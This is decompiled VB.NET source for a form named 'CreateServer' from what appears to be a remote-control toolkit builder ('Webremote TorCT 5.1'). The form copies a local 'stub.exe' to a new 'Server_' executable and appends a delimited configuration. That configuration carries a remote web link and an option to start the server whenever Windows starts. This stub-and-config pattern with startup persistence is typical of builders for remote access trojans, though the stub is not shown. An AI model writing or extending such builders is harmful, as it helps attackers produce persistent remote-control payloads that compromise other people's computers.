Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class CreateServer
        Inherits Form
        ' Methods
        Public Sub New()
            Dim list As List(Of WeakReference) = CreateServer.__ENCList
            SyncLock list
                CreateServer.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.autorun = "FALSE"
            Me.InitializeComponent
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim dialog As New SaveFileDialog
                Dim random As New Random
                dialog.Title = "Save File"
                dialog.FileName = ("Server_" & random.Next(&H3E8, &H1869F).ToString)
                dialog.Filter = "exe |*.exe"
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Dim str2 As String = "$SplitItems$"
                    Dim contents As String = String.Concat(New String() { str2, Me.TextBox2.Text, str2, Me.autorun.ToString, str2, "lol2", str2, "lol3" })
                    File.Copy((FileSystem.CurDir & "\stub.exe"), dialog.FileName)
                    File.AppendAllText(dialog.FileName, contents)
                    Interaction.MsgBox("Server Created!", MsgBoxStyle.ApplicationModal, Nothing)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("Something is wrong, If the file already exist please delete it", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
            Process.Start("http://www.torct.eu")
        End Sub

        Private Sub CheckBox1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.CheckBox1.Checked Then
                Me.autorun = "TRUE"
            Else
                Me.autorun = "FALSE"
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(CreateServer))
            Me.CheckBox1 = New CheckBox
            Me.Button2 = New Button
            Me.GroupBox2 = New GroupBox
            Me.Label8 = New Label
            Me.Label9 = New Label
            Me.TextBox2 = New TextBox
            Me.GroupBox2.SuspendLayout
            Me.SuspendLayout
            Me.CheckBox1.AutoSize = True
            Dim point As New Point(&H6D, &H2F)
            Me.CheckBox1.Location = point
            Me.CheckBox1.Name = "CheckBox1"
            Dim size As New Size(&HBA, &H11)
            Me.CheckBox1.Size = size
            Me.CheckBox1.TabIndex = &H1A
            Me.CheckBox1.Text = "Start Server When windows starts"
            Me.CheckBox1.UseVisualStyleBackColor = True
            point = New Point(&H6D, &HA7)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H68, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = &H19
            Me.Button2.Text = "Create Server"
            Me.Button2.UseVisualStyleBackColor = True
            Me.GroupBox2.Controls.Add(Me.Label8)
            point = New Point(15, &H3D)
            Me.GroupBox2.Location = point
            Me.GroupBox2.Name = "GroupBox2"
            size = New Size(&H134, 100)
            Me.GroupBox2.Size = size
            Me.GroupBox2.TabIndex = &H18
            Me.GroupBox2.TabStop = False
            Me.GroupBox2.Text = "Information"
            Me.Label8.AutoSize = True
            point = New Point(40, &H1A)
            Me.Label8.Location = point
            Me.Label8.Name = "Label8"
            size = New Size(210, &H34)
            Me.Label8.Size = size
            Me.Label8.TabIndex = 4
            Me.Label8.Text = "Make sure you use ""http://www.""" & ChrW(13) & ChrW(10) & "Don't use capslock where it isn't in the link!" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "If the files ar in a map, dont typ the last ""/"""
            Me.Label9.AutoSize = True
            point = New Point(&H27, &H18)
            Me.Label9.Location = point
            Me.Label9.Name = "Label9"
            size = New Size(&H3E, 13)
            Me.Label9.Size = size
            Me.Label9.TabIndex = &H17
            Me.Label9.Text = "Web Link : "
            point = New Point(&H6D, &H15)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&H9C, 20)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = &H16
            Me.TextBox2.Text = "http://Example.com"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H150, &HCA)
            Me.ClientSize = size
            Me.Controls.Add(Me.CheckBox1)
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.GroupBox2)
            Me.Controls.Add(Me.Label9)
            Me.Controls.Add(Me.TextBox2)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "CreateServer"
            Me.Text = "CreateServer"
            Me.TopMost = True
            Me.GroupBox2.ResumeLayout(False)
            Me.GroupBox2.PerformLayout
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub TextBox2_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.TextBox2.Text = "http://Example.com") Then
                Me.Button2.Enabled = False
            Else
                Me.Button2.Enabled = True
            End If
        End Sub


        ' Properties
        Friend Overridable Property Button2 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = WithEventsValue
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox1 As CheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._CheckBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As CheckBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CheckBox1_CheckedChanged)
                If (Not Me._CheckBox1 Is Nothing) Then
                    RemoveHandler Me._CheckBox1.CheckedChanged, handler
                End If
                Me._CheckBox1 = WithEventsValue
                If (Not Me._CheckBox1 Is Nothing) Then
                    AddHandler Me._CheckBox1.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property GroupBox2 As GroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._GroupBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As GroupBox)
                Me._GroupBox2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label8 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label8 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label9 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label9 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox2_TextChanged)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.TextChanged, handler
                End If
                Me._TextBox2 = WithEventsValue
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.TextChanged, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("CheckBox1")> _
        Private _CheckBox1 As CheckBox
        <AccessedThroughProperty("GroupBox2")> _
        Private _GroupBox2 As GroupBox
        <AccessedThroughProperty("Label8")> _
        Private _Label8 As Label
        <AccessedThroughProperty("Label9")> _
        Private _Label9 As Label
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        Private autorun As String
        Private components As IContainer
    End Class
End Namespace

